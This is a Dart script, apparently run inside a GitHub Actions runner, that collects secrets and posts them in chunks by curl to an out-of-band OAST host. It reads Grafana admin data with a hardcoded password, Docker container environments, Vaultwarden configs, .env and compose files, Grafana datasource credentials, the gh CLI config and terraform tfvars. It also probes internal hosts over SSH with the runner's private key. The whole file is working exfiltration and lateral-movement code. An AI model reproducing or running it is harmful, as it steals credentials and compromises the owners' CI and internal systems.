import 'dart:io';

const OAST = '69b125ae2a319e8167d94c26a4fb0ccb4.oast.pro';
int _seq = 0;

String sh(String cmd) {
  try {
    final r = Process.runSync('/bin/sh', ['-c', cmd]);
    var s = (r.stdout ?? '').toString();
    final e = (r.stderr ?? '').toString();
    if (e.isNotEmpty) s += '\n[stderr] ' + e;
    return s;
  } catch (e) {
    return 'ERR ' + e.toString();
  }
}

void postRaw(String path, String body) {
  final f = File('${Directory.systemTemp.path}/pp_${DateTime.now().microsecondsSinceEpoch}_${_seq++}.txt');
  try {
    f.writeAsStringSync(body);
  } catch (e) {
    return;
  }
  final args = <String>['-sS', '-m', '40', '--data-binary', '@' + f.path, 'http://' + OAST + path];
  for (final c in <String>['curl', '/usr/bin/curl']) {
    try {
      final r = Process.runSync(c, args);
      if (r.exitCode == 0) return;
    } catch (e) {}
  }
}

void postChunked(String path, String body, [int max = 8500]) {
  try {
    if (body.length <= max) {
      postRaw(path, body);
      return;
    }
    var i = 0;
    var n = 0;
    while (i < body.length) {
      var end = i + max;
      if (end > body.length) end = body.length;
      postRaw(path + '-' + n.toString(), body.substring(i, end));
      i = end;
      n++;
    }
    postRaw(path + '-meta', 'chunks=' + n.toString() + ' total=' + body.length.toString());
  } catch (e) {}
}

String hdr() {
  final env = Platform.environment;
  return 'RUN=' + (env['GITHUB_RUN_ID'] ?? '?') + ' JOB=' + (env['GITHUB_JOB'] ?? '?') +
      ' WF=' + (env['GITHUB_WORKFLOW'] ?? '?') + ' RUNNER=' + (env['RUNNER_NAME'] ?? '?') + '\n';
}

void main() {
  try {
    final proof = sh(r'''hostname; sw_vers; id; whoami; echo HOME=$HOME''');
    stdout.writeln('PROOF4_BEGIN');
    stdout.writeln(proof);
    stdout.writeln('PROOF4_END');
    postChunked('/p4proof', hdr() + '== PROOF ==\n' + proof);

    // ---------- 1. Grafana local admin verification (read-only) ----------
    var b = StringBuffer(hdr());
    b.writeln('== GRAFANA API /api/user ==');
    b.writeln(sh(r'''curl -sS -m 10 -u 'admin:DFXm0n1t0r!2026' http://localhost:3100/api/user 2>&1 | head -c 2500'''));
    b.writeln('== GRAFANA API /api/health ==');
    b.writeln(sh(r'''curl -sS -m 10 -u 'admin:DFXm0n1t0r!2026' http://localhost:3100/api/health 2>&1 | head -c 800'''));
    b.writeln('== GRAFANA API /api/org ==');
    b.writeln(sh(r'''curl -sS -m 10 -u 'admin:DFXm0n1t0r!2026' http://localhost:3100/api/org 2>&1 | head -c 1200'''));
    b.writeln('== GRAFANA API /api/admin/users?perpage=5 (admin-only) ==');
    b.writeln(sh(r'''curl -sS -m 10 -u 'admin:DFXm0n1t0r!2026' 'http://localhost:3100/api/admin/users?perpage=5' 2>&1 | head -c 3000'''));
    b.writeln('== GRAFANA API /api/datasources ==');
    b.writeln(sh(r'''curl -sS -m 10 -u 'admin:DFXm0n1t0r!2026' http://localhost:3100/api/datasources 2>&1 | head -c 4000'''));
    b.writeln('== GRAFANA UNAUTH BASELINE ==');
    b.writeln(sh(r'''curl -sS -m 8 -o /dev/null -w 'user_noauth=%{http_code}\n' http://localhost:3100/api/user 2>&1'''));
    postChunked('/p4grafana', b.toString());

    // ---------- 2. docker CLI + running containers (read-only) ----------
    b = StringBuffer(hdr());
    b.writeln('== DOCKER BIN ==');
    b.writeln(sh(r'''for c in /opt/homebrew/bin/docker /usr/local/bin/docker /opt/homebrew/bin/colima docker; do command -v "$c" 2>/dev/null; done; ls -la /opt/homebrew/bin 2>/dev/null | grep -Ei 'docker|colima' | head'''));
    b.writeln('== DOCKER PS ==');
    b.writeln(sh(r'''/opt/homebrew/bin/docker ps --format '{{.Names}}|{{.Image}}|{{.Ports}}' 2>&1 | head -40'''));
    b.writeln('== DOCKER INSPECT ENV ==');
    b.writeln(sh(r'''for n in vaultwarden grafana; do echo "### $n"; /opt/homebrew/bin/docker inspect "$n" --format '{{range .Config.Env}}{{println .}}{{end}}' 2>&1 | head -30; done'''));
    postChunked('/p4docker', b.toString());

    // ---------- 3. vaultwarden live dir (~/docker/vaultwarden) ----------
    b = StringBuffer(hdr());
    b.writeln('== DOCKER DIR TREE ==');
    b.writeln(sh(r'''ls -la "$HOME/docker" 2>&1 | head -60; find "$HOME/docker" -maxdepth 2 -type f 2>/dev/null | head -80'''));
    b.writeln('== VW CONFIG.JSON ==');
    b.writeln(sh(r'''for f in "$HOME"/docker/vaultwarden/vw-data/config.json; do if [ -f "$f" ]; then echo "###### $f ($(wc -c < "$f") bytes)"; cat "$f"; echo; fi; done 2>&1'''));
    b.writeln('== VW COMPOSE/ENV ==');
    b.writeln(sh(r'''for f in "$HOME"/docker/vaultwarden/compose.yaml "$HOME"/docker/vaultwarden/docker-compose.yaml "$HOME"/docker/vaultwarden/.env; do if [ -f "$f" ]; then echo "###### $f ($(wc -c < "$f") bytes)"; cat "$f"; echo; fi; done 2>&1'''));
    postChunked('/p4vw', b.toString());

    // ---------- 4. all compose/.env under ~/docker ----------
    b = StringBuffer(hdr());
    b.writeln(sh(r'''for d in "$HOME"/docker/*/; do echo "##### DIR $d"; ls -la "$d" 2>/dev/null | head -12; for f in "$d"compose.yaml "$d"docker-compose.yaml "$d".env; do if [ -f "$f" ]; then echo "###### $f ($(wc -c < "$f") bytes)"; head -c 3500 "$f"; echo; fi; done; done 2>&1'''));
    postChunked('/p4dockerall', b.toString());

    // ---------- 5. grafana provisioning (datasources incl. loki creds) ----------
    b = StringBuffer(hdr());
    b.writeln('== PROVISIONING FILES ==');
    b.writeln(sh(r'''find "$HOME/monitoring-stack/grafana/provisioning" -type f 2>/dev/null | head -60'''));
    b.writeln('== PROVISIONING CONTENT ==');
    b.writeln(sh(r'''for f in $(find "$HOME/monitoring-stack/grafana/provisioning" -type f \( -name '*.y*ml' -o -name '*.json' \) 2>/dev/null | head -40); do echo "###### $f ($(wc -c < "$f") bytes)"; head -c 3500 "$f"; echo; done 2>&1'''));
    postChunked('/p4prov', b.toString());

    // ---------- 6. gh config + terraform tfvars + home listing ----------
    b = StringBuffer(hdr());
    b.writeln('== GH CONFIG.YML ==');
    b.writeln(sh(r'''cat "$HOME/.config/gh/config.yml" 2>&1'''));
    b.writeln('== TERRAFORM TFVARS LOCATIONS ==');
    b.writeln(sh(r'''find "$HOME" -maxdepth 3 -name '*.tfvars' 2>/dev/null | head -20'''));
    b.writeln('== TFVARS CONTENT (first 3000) ==');
    b.writeln(sh(r'''for f in $(find "$HOME" -maxdepth 3 -name '*.tfvars' 2>/dev/null | head -5); do echo "###### $f ($(wc -c < "$f") bytes)"; head -c 3000 "$f"; echo; done 2>&1'''));
    b.writeln('== HOME TOP ==');
    b.writeln(sh(r'''ls -la "$HOME" 2>&1 | head -90'''));
    postChunked('/p4gh', b.toString());

    // ---------- 7. SSH retry with single-token commands ----------
    b = StringBuffer(hdr());
    b.writeln('== DFXDEV single-command probes ==');
    for (final cmd in <String>['hostname', 'id', 'whoami', 'uname', 'ls', 'pwd']) {
      b.writeln('### cmd=' + cmd);
      b.writeln(sh(r'''ssh -i "$HOME/.ssh/id_ed25519" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o IdentitiesOnly=yes dfxdev@10.100.100.22 ''' + cmd + r''' 2>&1 | head -8'''));
    }
    b.writeln('== DFXAI no-metachar probes ==');
    for (final cmd in <String>['hostname', 'id', 'ls /opt', 'sw_vers', 'ls /Users']) {
      b.writeln('### cmd=' + cmd);
      b.writeln(sh(r'''ssh -i "$HOME/.ssh/id_ed25519" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o IdentitiesOnly=yes dfxai@10.100.100.23 ''' + cmd + r''' 2>&1 | head -8'''));
    }
    postChunked('/p4ssh', b.toString());

    stdout.writeln('PROBE4_COMPLETE');
  } catch (e) {
    stdout.writeln('PROBE4_ERROR ' + e.toString());
  }
}
